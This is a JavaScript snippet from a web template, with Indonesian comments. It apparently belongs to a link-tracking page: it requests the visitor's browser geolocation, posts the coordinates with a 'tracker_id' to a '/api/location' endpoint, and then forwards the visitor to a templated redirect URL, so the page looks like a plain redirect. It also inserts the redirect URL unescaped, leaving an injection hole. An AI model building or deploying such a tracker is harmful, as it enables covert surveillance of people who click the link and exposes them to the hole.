function sendLocation(lat, lon, redirectUrl) {
  fetch('/api/location', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      tracker_id: "{{ tracker_id }}",
      latitude: lat,
      longitude: lon
    })
  }).then(() => {
    window.location.href = redirectUrl;
  });
}

const redirectUrl = "{{ redirect_url|safe }}";

if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(
    position => {
      sendLocation(position.coords.latitude, position.coords.longitude, redirectUrl);
    },
    error => {
      console.error("Gagal mendapatkan lokasi: ", error.message);
      window.location.href = redirectUrl; // Tetap redirect meskipun gagal
    }
  );
} else {
  console.error("Geolocation tidak didukung oleh browser ini.");
  window.location.href = redirectUrl; // Tetap redirect jika tidak didukung
}